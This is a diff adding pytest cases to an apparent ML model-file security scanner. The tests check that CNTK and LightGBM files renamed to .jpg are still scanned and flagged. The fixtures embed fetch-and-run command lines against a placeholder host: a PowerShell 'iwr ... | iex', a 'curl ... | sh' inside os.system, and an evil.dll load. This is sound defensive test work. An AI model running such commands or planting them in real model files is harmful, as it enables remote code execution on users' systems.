@@ -45,6 +45,25 @@ def _build_malicious_tf_savedmodel() -> bytes:
     return cast(bytes, saved_model.SerializeToString())
 
 
+def _build_malicious_cntkv2() -> bytes:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    return (
+        prefix
+        + b" CompositeFunction primitive_functions native_user_function loadlibrary C:\\temp\\evil.dll "
+        + b"powershell -c iwr http://evil.example/p.ps1 | iex base64.b64decode("
+        + (b"A" * 96)
+        + b") exec(payload) "
+    )
+
+
+def _build_malicious_lightgbm() -> bytes:
+    return (
+        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
+        b"feature_names=f0 f1\ntree_sizes=12\nTree=0\nnum_leaves=2\nsplit_feature=0\n"
+        b"leaf_value=0.1 0.2\nmetadata=os.system('curl https://evil.example/p.sh | sh')\n"
+    )
+
+
 def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
     """Patch a ZIP member CRC so full scanning sees a malformed entry."""
     with zipfile.ZipFile(path) as archive:
@@ -341,6 +360,42 @@ class TestDirectoryFileFiltering:
         results = scan_model_directory_or_file(str(tmp_path))
 
         assert results["files_scanned"] == 0
+
+    @pytest.mark.parametrize(
+        ("scanner_name", "payload"),
+        [("cntk", _build_malicious_cntkv2()), ("lightgbm", _build_malicious_lightgbm())],
+    )
+    def test_disguised_signature_backed_malicious_model_is_scanned(
+        self,
+        tmp_path: Path,
+        scanner_name: str,
+        payload: bytes,
+    ) -> None:
+        disguised_model = tmp_path / f"{scanner_name}.jpg"
+        disguised_model.write_bytes(payload)
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert scanner_name in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.severity.value == "critical" for issue in results.issues)
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab inputs",
+            b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n",
+        ],
+    )
+    def test_disguised_signature_near_match_remains_skipped(self, tmp_path: Path, payload: bytes) -> None:
+        near_match = tmp_path / "near-match.jpg"
+        near_match.write_bytes(payload)
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 0
+        assert results.issues == []
 
     def test_disguised_malicious_coreml_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         """Directory scans should preserve structurally recognized renamed CoreML payloads."""
